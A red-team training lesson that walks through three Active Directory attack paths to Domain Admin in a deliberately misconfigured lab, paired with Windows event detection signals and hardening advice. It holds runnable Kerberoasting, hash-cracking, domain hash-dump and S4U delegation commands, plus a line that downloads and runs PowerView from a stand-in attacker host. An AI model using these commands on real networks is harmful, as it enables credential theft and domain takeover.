---
title: "AD Attack Lab — BloodHound to Domain Admin"
tags: [red-team, active-directory, BloodHound, lab, attack-path, Kerberoasting,
  ACL-abuse, constrained-delegation, ATT&CK]
module: 08-RedTeam-02
day: 502
related_topics:
  - AD Attack Path Analysis (Day 501)
  - Exchange and Email Attacks (Day 503)
  - Domain Dominance (Day 499)
  - Lateral Movement Advanced (Day 498)
---

# Day 502 — AD Attack Lab

> "Analysis without execution is just planning. Today you execute the path
> BloodHound showed you yesterday. Three paths available in the lab. Take the
> shortest one first. Document every step. If a step fails, fall back to path
> two and write down exactly why path one broke. That is the report."
>
> — Ghost

---

## Goals

Execute a full BloodHound-identified attack path from a low-privilege domain
user to Domain Admin.
Practise three different path types: Kerberoasting, ACL abuse, and constrained
delegation abuse.
Document every action in the format required for a red team engagement report.

**Prerequisites:** Day 501 (BloodHound analysis), Day 499 (domain dominance
techniques), Day 498 (lateral movement), lab AD environment with Sliver beacon
active.
**Time budget:** 6 hours.

---

## Part 1 — Lab Setup

The lab requires an Active Directory environment with deliberately misconfigured
attack paths. Use the following configuration on a lab DC and member server.

### Deliberately Vulnerable AD Configuration

```powershell
# Run on the lab DC as Domain Admin to set up the vulnerable paths

# --- Path A: Kerberoasting to DA ---
# Create a Kerberoastable service account with a weak password:
New-ADUser -Name "svc_webapp" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true
# Set an SPN (makes it Kerberoastable):
Set-ADUser svc_webapp -Add @{ServicePrincipalName="HTTP/webapp.corp.local"}
# Add to Domain Admins (the prize):
Add-ADGroupMember "Domain Admins" -Members svc_webapp

# --- Path B: ACL Abuse (GenericWrite to group) ---
# Create a helpdesk user and give them GenericWrite on the IT_Admins group:
New-ADUser -Name "helpdesk_user" -AccountPassword (ConvertTo-SecureString "Helpdesk123!" -AsPlainText -Force) `
    -Enabled $true
$helpdesk = Get-ADUser helpdesk_user
$target_group = Get-ADGroup "Domain Admins"
$acl = Get-Acl "AD:\$($target_group.DistinguishedName)"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $helpdesk.SID, "GenericWrite", "Allow"
)
$acl.AddAccessRule($ace)
Set-Acl "AD:\$($target_group.DistinguishedName)" $acl

# --- Path C: Constrained Delegation ---
New-ADUser -Name "svc_delegate" -AccountPassword (ConvertTo-SecureString "Delegate123!" -AsPlainText -Force) `
    -Enabled $true
Set-ADUser svc_delegate -Add @{ServicePrincipalName="cifs/filesrv.corp.local"}
# Grant constrained delegation to the DC:
Set-ADUser svc_delegate -Replace @{msDS-AllowedToDelegateTo="cifs/DC01.corp.local"}
Set-ADAccountControl svc_delegate -TrustedToAuthForDelegation $true
```

---

## Part 2 — Path A: Kerberoasting

Kerberoasting requests a TGS for a service account's SPN, receives it encrypted
with the service account's password hash, and cracks it offline.

```bash
# Step 1: Identify Kerberoastable accounts (BloodHound or Rubeus):
[beacon] > execute-assembly /path/to/Rubeus.exe kerberoast /nowrap
# → Returns base64-encoded TGS hashes for all Kerberoastable accounts
# → Look for svc_webapp — note the hash format: $krb5tgs$23$...

# Step 2: Save the hash to a file on attacker machine:
# hashcat format: $krb5tgs$23$*svc_webapp*CORP.LOCAL*HTTP/webapp.corp.local*...

# Step 3: Crack offline with hashcat:
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
    --rules-file /usr/share/hashcat/rules/best64.rule
# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4)

# Step 4: Verify credential:
python3 getTGT.py corp.local/svc_webapp:'Summer2024!' -dc-ip DC_IP
# → returns svc_webapp.ccache

# Step 5: Use the TGT (svc_webapp is a DA):
export KRB5CCNAME=svc_webapp.ccache
python3 secretsdump.py -k -no-pass DC01.corp.local
# → Full domain hash dump as Domain Admin
```

### Detection Signals for Path A

```
Event 4769: Service Ticket Request
  AccountName: any user (the requester)
  ServiceName: svc_webapp  (or any account with a SPN)
  TicketEncryptionType: 0x17 (RC4-HMAC) — downgrade from AES
  FailureCode: 0x0 (success)

Alert condition:
  4769 with EncryptionType = 0x17 for a non-computer SPN → Kerberoasting
  Hunting: volume of 4769 requests per user in a short window

Hardening:
  Use AES256 SPNs (not RC4): Set-ADUser svc_webapp -KerberosEncryptionType AES256
  Use Managed Service Accounts (MSA/gMSA): auto-rotated, 120-char passwords
  Detect accounts with SPNs AND high privileges: they should not both be true
```

---

## Part 3 — Path B: ACL Abuse (GenericWrite)

`GenericWrite` on a group allows writing to non-protected attributes — including
adding members.

```powershell
# Compromised: helpdesk_user session via beacon

# Step 1: Confirm GenericWrite via PowerShell:
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$group = Get-ADGroup "Domain Admins"
$acl = Get-Acl "AD:\$($group.DistinguishedName)"
$acl.Access | Where-Object { $_.IdentityReference -like "*helpdesk*" }
# → Should show GenericWrite

# Step 2: Add helpdesk_user to Domain Admins:
Add-ADGroupMember -Identity "Domain Admins" -Members helpdesk_user
# With GenericWrite on the group, this is permitted

# Verify:
Get-ADGroupMember "Domain Admins" | Select Name
# → helpdesk_user now appears

# Step 3: Use DA credential:
net use \\DC01.corp.local\C$ /user:corp\helpdesk_user Helpdesk123!
# → Success — helpdesk_user is now a DA
```

### Via PowerView (If Available)

```powershell
# Import PowerView from memory (no disk touch):
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Check ACL:
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
    Where-Object { $_.IdentityReferenceName -eq "helpdesk_user" }

# Add member:
Add-DomainGroupMember -Identity "Domain Admins" -Members helpdesk_user
```

### Detection Signals for Path B

```
Event 5136: Directory Service Object Modified
  ObjectClass: group
  AttributeLDAPDisplayName: member
  OperationType: Value Added
  SubjectUserName: helpdesk_user (not an admin account)

  Alert: non-admin user adding members to Domain Admins

Event 4728: Member Added to Security-Enabled Global Group
  MemberName: helpdesk_user
  GroupName: Domain Admins
  SubjectUserName: helpdesk_user (should be a DA or group manager, not a member)
```

---

## Part 4 — Path C: Constrained Delegation Abuse (S4U2Proxy)

Constrained delegation with protocol transition (`TrustedToAuthForDelegation`)
allows the service account to impersonate any user to the target service —
without knowing that user's password.

```bash
# svc_delegate has constrained delegation to cifs/DC01.corp.local
# This means: svc_delegate can request a TGS on behalf of ANY USER to DC01 CIFS

# Step 1: Get svc_delegate's hash (from LSASS or Kerberoasting):
# Assume NTLM hash: DELEGATE_NTLM_HASH

# Step 2: Use Rubeus S4U to impersonate Administrator on DC01 CIFS:
[beacon] > execute-assembly /path/to/Rubeus.exe s4u \
    /user:svc_delegate \
    /rc4:DELEGATE_NTLM_HASH \
    /impersonateuser:Administrator \
    /msdsspn:cifs/DC01.corp.local \
    /ptt
# → Requests a TGS for Administrator@CORP.LOCAL to access cifs/DC01.corp.local
# → Injects the ticket into the current session

# Verify:
klist  # shows a TGS for cifs/DC01.corp.local as Administrator

# Use it:
dir \\DC01.corp.local\C$
# → Access as Administrator
```

### How S4U Works

```
S4U2Self:
  svc_delegate requests a TGS for Administrator → svc_delegate
  (the KDC issues it because TrustedToAuthForDelegation is set)

S4U2Proxy:
  svc_delegate presents the S4U2Self ticket to request a TGS
  for Administrator → cifs/DC01.corp.local
  (the KDC allows it because msDS-AllowedToDelegateTo includes cifs/DC01)

Result: a valid TGS for Administrator to cifs/DC01.corp.local
No Administrator password or TGT needed.
```

### Detection Signals for Path C

```
Event 4769: Service Ticket Request
  ServiceName: svc_delegate
  TicketOptions includes "forwardable" flag (0x40810010)

Event 4769 (second): Service Ticket for cifs/DC01.corp.local
  AccountName: Administrator
  BUT the source is svc_delegate performing S4U2Proxy

MDI detection:
  "Suspected Kerberos SPN attack" for S4U2Self to a highly-privileged account
  "Constrained delegation abuse" — MDI-specific alert
```

---

## Part 5 — Documentation Template

Every action in a real engagement is documented as follows:

```
## Action Log Entry

Timestamp:     2026-04-30 14:23:11 UTC
Operator:      Ghost
Host:          WORKSTATION05.corp.local (beacon PID: 4821)
Technique:     Kerberoasting
ATT&CK:        T1558.003 (Steal or Forge Kerberos Tickets: Kerberoast)

Command executed:
  Rubeus.exe kerberoast /nowrap

Output summary:
  1 ticket returned: svc_webapp ($krb5tgs$23$...)
  Offline crack: hashcat -m 13100 → Summer2024! (cracked in 4 min)

Impact:
  svc_webapp is a member of Domain Admins.
  Credential grants full domain control.

Detection signal:
  Event 4769 with EncryptionType 0x17 for svc_webapp SPN.
  No alert fired — Sysmon + Splunk rule not tuned for RC4 downgrade.

Next action:
  Use svc_webapp TGT to execute DCSync and extract krbtgt hash.
```

---

## Key Takeaways

1. Kerberoasting is noisy if you request all SPNs at once. Request only the
   targeted SPN to reduce Event 4769 volume. BloodHound's path tells you which
   account to target — do not sweep everything.
2. ACL abuse is the most under-detected attack path. Event 5136 is rarely
   monitored. Most SOCs watch Event 4728 (group membership change) but miss
   that the actor performing the change was not authorised.
3. Constrained delegation with protocol transition (`TrustedToAuthForDelegation`)
   is equivalent to a service-scoped Golden Ticket. The service account can
   impersonate anyone to its configured targets.
4. Document during the engagement, not after. Memory fades. The log entry
   format in Part 5 takes 90 seconds to fill in and saves hours during
   report writing.
5. Always verify the attack path in BloodHound before executing. Paths change
   as sessions come and go. A `HasSession` edge that existed during collection
   may not exist when you execute an hour later.

---

## Exercises

1. Execute Path A (Kerberoasting) against the lab. Record the exact hashcat
   command, the crack time, and all Event 4769 entries on the DC. Write the
   action log entry per the template in Part 5.
2. Execute Path B (ACL abuse) using only native PowerShell (no PowerView). Verify
   with `Get-ADGroupMember`. Record Event 5136 and 4728.
3. Execute Path C (S4U2Proxy with Rubeus). Inspect the injected ticket with
   `klist`. Explain the S4U2Self → S4U2Proxy chain in your own words.
4. After each path execution: reset the lab to the clean state (docker compose
   restart or VM snapshot revert). This discipline is critical — the next student
   who uses the lab should not inherit your artefacts.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q502.1, Q502.2 …).

---

## Navigation

← Previous: [Day 501 — AD Attack Path Analysis](DAY-0501-AD-Attack-Path-Analysis.md)
→ Next: [Day 503 — Exchange and Email Attacks](DAY-0503-Exchange-and-Email-Attacks.md)
